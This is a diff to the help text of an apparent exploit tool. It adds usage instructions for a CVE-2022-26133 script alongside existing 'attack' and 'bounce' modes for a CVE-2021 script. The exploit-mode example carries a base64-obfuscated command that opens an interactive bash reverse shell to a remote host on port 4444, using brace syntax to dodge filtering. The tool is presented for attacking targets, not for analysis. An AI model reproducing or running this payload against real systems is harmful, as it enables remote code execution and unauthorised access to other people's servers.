@@ -26,7 +26,20 @@ def usage():
         Attack mode: python CVE_2021.py -a true -u target_url -c command 
         Batch detection: python CVE_2021.py -s true -f file
         Bounce mode: python CVE_2021.py -r true -u target_url -c command 
-    +===========================================================================+                                  
+    +===========================================================================+   
+    +===========================================================================+  
+    CVE-2022-26133
+         python3 CVE-26133.py -h
+         usage: CVE-26133.py [-h] [-u URL] [--verify] [-c COMMAND] [-f FILE]
+         optional arguments:
+         -h, --help  show this help message and exit
+         -u URL      input target url, eg: http://192.168.1.1:7990/
+         --verify    verify mode, verify if target is vulnerable.
+         -c COMMAND  exploit mode, eg: bash -c
+              {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}
+         -f FILE     verify targets in the file if vulnerable.   
+    +===========================================================================+   
+                                 
     ''')
 
 
